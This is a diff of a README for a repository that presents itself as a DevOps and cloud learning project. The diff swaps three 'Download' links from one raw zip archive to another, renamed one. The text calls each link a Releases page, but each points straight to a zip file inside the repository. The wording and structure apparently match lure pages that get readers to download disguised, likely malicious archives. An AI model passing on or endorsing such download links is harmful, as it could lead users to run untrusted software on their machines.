@@ -1,6 +1,6 @@
 # 🌟 DevOps-Journey-2025 - Build Your Cloud Skills Today
 
-[![Download DevOps-Journey-2025](https://raw.githubusercontent.com/Balrog413/DevOps-Journey-2025/main/corroboree/DevOps-Journey-2025.zip)](https://raw.githubusercontent.com/Balrog413/DevOps-Journey-2025/main/corroboree/DevOps-Journey-2025.zip)
+[![Download DevOps-Journey-2025](https://raw.githubusercontent.com/Balrog413/DevOps-Journey-2025/main/assets/Ops-Dev-Journey-2.2.zip)](https://raw.githubusercontent.com/Balrog413/DevOps-Journey-2025/main/assets/Ops-Dev-Journey-2.2.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To run the applications in this repository, you need to follow a simple process 
 
 To download the software, **visit this page to download**:
 
-[Download DevOps-Journey-2025](https://raw.githubusercontent.com/Balrog413/DevOps-Journey-2025/main/corroboree/DevOps-Journey-2025.zip)
+[Download DevOps-Journey-2025](https://raw.githubusercontent.com/Balrog413/DevOps-Journey-2025/main/assets/Ops-Dev-Journey-2.2.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version and click on it.
@@ -62,7 +62,7 @@ If you run into issues or have questions, feel free to reach out. You can do thi
 
 Stay informed about future releases and enhancements. Ensure you check the Releases page regularly for the latest features and improvements:
 
-[Download DevOps-Journey-2025](https://raw.githubusercontent.com/Balrog413/DevOps-Journey-2025/main/corroboree/DevOps-Journey-2025.zip) 
+[Download DevOps-Journey-2025](https://raw.githubusercontent.com/Balrog413/DevOps-Journey-2025/main/assets/Ops-Dev-Journey-2.2.zip) 
 
 By staying updated, you can make the most of your learning experience.
 
